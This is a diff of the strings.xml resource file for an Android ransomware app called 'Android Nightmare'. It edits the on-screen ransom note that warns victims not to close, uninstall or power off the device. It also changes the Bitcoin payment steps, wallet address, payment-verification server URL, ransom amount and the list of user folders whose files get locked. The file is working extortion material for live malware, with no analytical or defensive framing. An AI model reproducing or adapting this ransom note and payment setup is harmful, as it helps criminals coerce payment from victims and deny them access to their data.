@@ -3,7 +3,7 @@
 	<string name="app_name">Android Nightmare</string>
 	<string name="pwned_message">YOU GOT PWNED</string>
 	<string name="encrypted_log_message">Total files locked with encryption</string>
-	<string name="warning">WARNING,\nYour data has been encrypted, all your personal videos, photos, documents and files have been LOCKED with encryption !\nDO NOT,\n• Close This Screen\n• Uninstall This Application.\n• Power Off This Device.\n• Disconnect Internet Access.\n\nThe one-time decryption key will be deleted if you do not follow these instructions, your files will be LOST FOREVER.\n\nDO,\n• Plug In Your Charger To Stop Any Accidents\n• Pay As Soon As Possible.</string>
+	<string name="warning">WARNING,\nYour data has been encrypted, all your personal videos, photos, documents and files have been LOCKED with encryption !\nDO NOT,\n• Close This Screen\n• Uninstall This Application.\n• Power Off This Device.\n• Disconnect Internet Access.\n\nThe one-time decryption key will be deleted if you do not follow these instructions, your files will be LOST FOREVER.\n\nDO,\n• Plug In Your Charger To Stop Any Accidents\n• Pay As Soon As Possible.\n• Open Your Computer or use another device to copy the Address.\n• Manually write down the TxID from your payment on a another device.</string>
 	<string name="splash_message">DO NOT CLOSE this app until finished, NOT following these instructions will DAMAGE your storage device.\n\nWe take no responsibility if you do not follow these instructions.</string>
 	<string name="decryption_impossible_notice">DECRYPTION IMPOSSIBLE</string>
 	<string name="decryption_impossible_message">You have closed or reinstalled the application, your unique session key was removed and decryption is now impossible.</string>
@@ -19,7 +19,8 @@
 	<string name="transaction_pending_button_text">TRY AGAIN</string>
 	<string name="transaction_pending_log_message">Verification failed due to transaction still pending.</string>
 	<string name="transaction_incorrect_button_text">TRY AGAIN</string>
-	<string name="transaction_incorrect_log_message">Verification failed due to incorrect payment amount or incorrect Tx ID.</string>
+	<string name="transaction_incorrect_log_message">Verification failed due to incorrect payment amount or incorrect TxID.</string>
+    <string name="transaction_low_log_message">Verification failed due to incorrect payment amount.</string>
 	<string name="transaction_server_connection_failure_log_message">Verification failed due to internet access failure.</string>
 	<string name="decrypting_files_started_log_message">DECRYPTING FILES NOW</string>
 	<string name="decrypting_files_finished_log_message">DECRYPTED FILES OK</string>
@@ -29,11 +30,13 @@
 	<string name="return_to_the_app_message">RETURN TO THE APP FOOL\nExiting app will LOCK your files forever, decryption will be impossible.</string>
 	<string name="payment_server_https_url">https://btctrans.herokuapp.com</string>
 	<string name="wallet_type">฿ Bitcoin Wallet Address</string>
-	<string name="ransom_amount">1000</string>
+	<string name="ransom_amount">50000</string>
 	<string name="wallet_address">15knn9nNy7uzgC3nsaupUYB5n3PYXmtnDy</string>
 	<string name="demo_txid">62f1085c06aa841bcca8c3ade28c64429c83204a56bf072cd3ed76e22c1495be</string>
-	<string name="testing">no</string>
-	<string name="step1">Immediately send exactly ฿ 1,000 Satoshi\n(Bitcoin currency)\nto the following wallet address,</string>
+	<string name="testing">true</string>
+	<string name="step1">Immediately send exactly</string>
+    <string name="steptype">Satoshi (Bitcoin currency)</string>
+    <string name="stepend">to the following address.</string>
 	<string name="step2">Enter your transaction id "TxID" to decrypt your files</string>
 	<string-array name="directories">
 		<item>Pictures</item>
